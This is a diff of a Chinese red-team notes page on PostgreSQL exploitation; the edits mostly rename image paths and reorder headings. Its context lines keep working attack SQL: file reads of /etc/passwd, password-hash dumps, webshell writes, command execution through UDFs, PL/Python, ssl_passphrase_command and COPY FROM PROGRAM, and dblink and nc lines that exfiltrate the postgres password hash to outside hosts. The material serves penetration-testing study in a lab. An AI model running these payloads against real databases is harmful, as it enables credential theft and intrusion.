@@ -62,9 +62,9 @@ SHOW server_version_num;
 SELECT current_setting('server_version_num');
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/5.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/5.png)
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/6.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/6.png)
 
 **列目录**
 
@@ -79,9 +79,9 @@ select setting from pg_settings where name = 'data_directory';
 select setting from pg_settings where name='config_file'
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/13.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/13.png)
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/30.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/30.png)
 
 **列出数据库**
 
@@ -89,7 +89,7 @@ select setting from pg_settings where name='config_file'
 SELECT datname FROM pg_database;
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/14.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/14.png)
 
 **查看支持的语言**
 
@@ -97,7 +97,7 @@ SELECT datname FROM pg_database;
 select * from pg_language;
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/22.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/22.png)
 
 **查看安装的扩展**
 
@@ -105,7 +105,7 @@ select * from pg_language;
 select * from pg_available_extensions;
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/23.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/23.png)
 
 **查看服务器 ip 地址**
 
@@ -114,7 +114,7 @@ select * from pg_available_extensions;
 select inet_server_addr()
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/38.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/38.png)
 
 ---
 
@@ -136,13 +136,13 @@ SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
 SELECT usename, passwd FROM pg_shadow;
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/7.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/7.png)
 
 ```sql
 SELECT rolname,rolpassword FROM pg_authid;
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/19.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/19.png)
 
 可以看到,目前查询到的用户 hash 已经是 scram-sha-256,在以前的版本是加盐md5
 
@@ -152,7 +152,7 @@ SELECT rolname,rolpassword FROM pg_authid;
 SELECT name,setting,source,enumvals FROM pg_settings WHERE name = 'password_encryption';
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/20.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/20.png)
 
 **添加用户**
 
@@ -211,7 +211,7 @@ FROM pg_catalog.pg_roles r
 ORDER BY 1;
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/18.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/18.png)
 
 ---
 
@@ -227,7 +227,7 @@ select pg_read_file('/etc/passwd');
 select/**/PG_READ_FILE($$/etc/passwd$$)
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/15.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/15.png)
 
 **方法2**
 
@@ -237,7 +237,7 @@ copy testf0x from '/etc/passwd';
 select * from testf0x limit 1 offset 0;
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/8.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/8.png)
 
 **方法3 lo_import**
 
@@ -252,15 +252,15 @@ select/**/lo_import($$/etc/passwd$$,11111);
 select/**/cast(encode(data,$$base64$$)as/**/integer)/**/from/**/pg_largeobject/**/where/**/loid=11111
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/9.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/9.png)
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/10.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/10.png)
 
 ---
 
 ## PostgreSQL 写文件
 
-**利用条件**
+**写 webshell 所需的利用条件**
 - 拥有网站路径写入权限
 - 知道网站绝对路径
 
@@ -272,18 +272,18 @@ COPY 命令可以用于表和文件之间交换数据，这里可以用它写 we
 COPY (select '<?php phpinfo();?>') to '/tmp/1.php';
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/1.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/1.png)
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/2.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/2.png)
 
 也可以 base64 一下
 ```sql
 COPY (select convert_from(decode('ZmZmZmZmZmYweA==','base64'),'utf-8')) to '/tmp/success.txt';
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/16.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/16.png)
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/17.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/17.png)
 
 **方法2 lo_export**
 
@@ -298,9 +298,9 @@ select lo_from_bytea(12350,decode('ZmZmZmZmZmYweA==','base64'));
 SELECT lo_export(12350, '/tmp/ffffffff0x.txt');
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/36.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/36.png)
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/37.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/37.png)
 
 **方法3 lo_export + pg_largeobject**
 
@@ -313,11 +313,11 @@ INSERT INTO pg_largeobject(loid, pageno, data) values (24577, 0, decode('ZmZmZmZ
 select lo_export(24577, '/tmp/success.txt');
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/31.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/31.png)
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/32.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/32.png)
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/33.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/33.png)
 
 如果内容过多，那么首先创建一个 OID 作为写入的对象, 然后通过 0,1,2,3… 分片上传但是对象都为 12345 最后导出到 /tmp 目录下, 收尾删除 OID
 
@@ -333,9 +333,9 @@ SELECT lo_export(12345, '/tmp/ffffffff0x.txt');
 SELECT lo_unlink(12345);
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/11.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/11.png)
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/12.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/12.png)
 
 或者还可以用 lo_put 在后面拼接进行写入
 
@@ -349,11 +349,11 @@ select lo_export(11141,'/tmp/test.txt');
 SELECT lo_unlink(11141);
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/45.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/45.png)
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/46.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/46.png)
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/47.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/47.png)
 
 结束记得清理 OID 内容
 ```sql
@@ -370,10 +370,7 @@ SELECT lo_unlink(12345);
 
 ### 通过 log_directory 创建文件夹
 
-方法来自于 https://www.yulegeyu.com/2020/11/16/Postgresql-Superuser-SQL%E6%B3%A8%E5%85%A5-RCE%E4%B9%8B%E6%97%85/ 这篇文章的场景
-
-**利用条件**
-- 目标已经配置了 `logging_collector = on`
+> 方法来自于 https://www.yulegeyu.com/2020/11/16/Postgresql-Superuser-SQL%E6%B3%A8%E5%85%A5-RCE%E4%B9%8B%E6%97%85/ 这篇文章的场景
 
 **描述**
 
@@ -383,14 +380,17 @@ SELECT lo_unlink(12345);
 
 logging_collector 配置是否开启日志，只能在服务开启时配置，reloadconf 无法修改,log_directory 用来配置 log 日志文件存储到哪个目录，如果 log_directory 配置到一个不存在的目录,pgsql 会创建目录。
 
-**测试**
+**利用条件**
+- 目标已经配置了 `logging_collector = on`
+
+**复现测试**
 
 拿靶机中的 postgresql 为例，先查看配置文件的路径
 ```bash
 select setting from pg_settings where name='config_file'
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/39.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/39.png)
 
 查看内容
 ```bash
@@ -426,22 +426,22 @@ SELECT lo_unlink(10001);
 select pg_reload_conf();
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/40.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/40.png)
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/41.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/41.png)
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/42.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/42.png)
 
 ```sql
 -- 查询一下修改是否成功
 select name,setting,short_desc from pg_settings where name like 'log_%';
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/43.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/43.png)
 
 进入靶机,可以看到 f0x 目录已经创建
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/44.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/44.png)
 
 ---
 
@@ -455,14 +455,14 @@ CREATE EXTENSION dblink
 SELECT * FROM dblink('host='||(select user)||'.djw0pg.dnslog.cn user=test dbname=test', 'SELECT version()') RETURNS (result TEXT);
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/21.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/21.png)
 
 ```sql
 -- 查询当前密码
 SELECT * FROM dblink('host='||(SELECT passwd FROM pg_shadow WHERE usename='postgres')||'.c8jrsjp2vtc0000rwce0grjcc3oyyyyyb.interact.sh user=test dbname=test', 'SELECT version()') RETURNS (result TEXT);
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/34.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/34.png)
 
 ```sql
 -- nc 监听
@@ -471,13 +471,15 @@ nc -lvv 4445
 select dblink_connect((select 'hostaddr=x.x.x.x port=4445 user=test password=test sslmode=disable dbname='||(SELECT passwd FROM pg_shadow WHERE usename='postgres')));
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/35.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/35.png)
 
 ---
 
 ## PostgreSQL 提权
 
 ### 利用 UDF 命令执行
+
+**描述**
 
 在 8.2 以前,postgresql 不验证 magic block,可以直接调用本地的 libc.so
 ```sql
@@ -487,6 +489,8 @@ SELECT system('cat /etc/passwd | nc xxx.xx.xx.xx');
 
 8.2 以上版本,需要自己编译 so 文件去创建执行命令函数，可以自己编译反弹 shell 后门，也可以用 sqlmap 提供好的
 - https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/postgresql
+
+**复现测试**
 
 可以参考 [No-Github/postgresql_udf_help](https://github.com/No-Github/postgresql_udf_help)
 
@@ -508,11 +512,15 @@ cat lib_postgresqludf_sys.so | xxd -ps | tr -d "\n" > 1.txt
 python2 postgresql_udf_help.py 1.txt > sqlcmd.txt
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/4.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/4.png)
 
 ### PL/Python 扩展
 
+**描述**
+
 PostgreSQL 可以支持多种存储过程语言，官方支持的除了 PL/pgSQL，还有 TCL，Perl，Python 等。
+
+**复现测试**
 
 默认 PostgreSQL 不会安装 Python 的扩展,这里我手动在靶机上安装下进行复现
 ```sql
@@ -521,7 +529,7 @@ select version();
 
 先看下版本, pg 14
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/24.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/24.png)
 
 搜索下有没有对应的 plpython3u 版本安装
 
@@ -529,7 +537,7 @@ select version();
 apt search postgresql-plpython
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/25.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/25.png)
 
 有,那么直接装
 
@@ -543,7 +551,7 @@ apt install postgresql-plpython-14
 create extension plpython3u;
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/26.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/26.png)
 
 查看是否支持 plpython3u
 
@@ -551,7 +559,7 @@ create extension plpython3u;
 select * from pg_language;
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/27.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/27.png)
 
 创建一个 UDF 来执行我们要执行的命令
 
@@ -564,18 +572,18 @@ AS $$
 $$ LANGUAGE plpython3u;
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/28.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/28.png)
 
 创建好 UDF 后，进行调用
 ```sql
 select system('ls -la');
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/29.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/29.png)
 
 ### 利用 session_preload_libraries 加载共享库
 
-方法来自于 https://www.yulegeyu.com/2020/11/16/Postgresql-Superuser-SQL%E6%B3%A8%E5%85%A5-RCE%E4%B9%8B%E6%97%85/ 这篇文章的场景
+> 方法来自于 https://www.yulegeyu.com/2020/11/16/Postgresql-Superuser-SQL%E6%B3%A8%E5%85%A5-RCE%E4%B9%8B%E6%97%85/ 这篇文章的场景
 
 **描述**
 
@@ -587,16 +595,16 @@ session_preload_libraries 只允许 superuser 修改，但可以加载任意目�
 
 ### 利用 ssl_passphrase_command 执行命令
 
-方法来自于 https://pulsesecurity.co.nz/articles/postgres-sqli 这篇文章的场景
-
-**利用条件**
-- 需要知道 PG_VERSION 文件的位置 (不是 PG_VERSION 文件也行,pgsql限制私钥文件权限必须是0600才能够加载，pgsql目录下的所有0600权限的文件都是可以的,但覆盖后没啥影响的就 PG_VERSION 了)
+> 方法来自于 https://pulsesecurity.co.nz/articles/postgres-sqli 这篇文章的场景
 
 **描述**
 
 当配置文件中配置了 ssl_passphrase_command ，那么该配置在需要获取用于解密SSL文件密码时会调用该配置的命令。
 
 通过上传 pem，key 到目标服务器上，读取配置文件内容，修改配置文件中的ssl配置改为我们要执行的命令，通过lo_export覆盖配置文件，最后通过 pg_reload_conf 重载配置文件时将执行命令
+
+**利用条件**
+- 需要知道 PG_VERSION 文件的位置 (不是 PG_VERSION 文件也行,pgsql限制私钥文件权限必须是0600才能够加载，pgsql目录下的所有0600权限的文件都是可以的,但覆盖后没啥影响的就 PG_VERSION 了)
 
 **复现**
 
@@ -635,7 +643,7 @@ SELECT lo_unlink(10004);
 
 在靶机中查看验证是否写入成功
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/49.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/49.png)
 
 读取配置文件内容
 
@@ -672,15 +680,15 @@ SELECT lo_unlink(10001);
 select pg_reload_conf();
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/50.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/50.png)
 
 可以看到,重新加载配置文件后,ssl_passphrase_command 中的命令已经执行
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/48.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/48.png)
 
 ### CVE-2018-1058 PostgreSQL 提权漏洞
 
-**描述**
+**漏洞描述**
 
 PostgreSQL 其 9.3 到 10 版本中存在一个逻辑错误，导致超级用户在不知情的情况下触发普通用户创建的恶意代码，导致执行一些不可预期的操作。
 
@@ -692,13 +700,13 @@ PostgreSQL 其 9.3 到 10 版本中存在一个逻辑错误，导致超级用户
 
 ### CVE-2019-9193 PostgreSQL 高权限命令执行漏洞
 
-**描述**
+**漏洞描述**
 
 PostgreSQL 其 9.3 到 11 版本中存在一处“特性”，管理员或具有“COPY TO/FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。
 
 **利用条件**
-- 版本9.3-11.2
-- 超级用户或者pg_read_server_files组中的任何用户
+- 版本 9.3-11.2
+- 超级用户或者 pg_read_server_files 组中的任何用户
 
 **相关文章**
 - [Authenticated Arbitrary Command Execution on PostgreSQL 9.3 > Latest](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)
@@ -712,7 +720,7 @@ COPY cmd_exec FROM PROGRAM 'id';
 SELECT * FROM cmd_exec;
 ```
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/PostgreSQL/3.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/PostgreSQL/3.png)
 
 ### CVE-2020-25695 权限提升
 
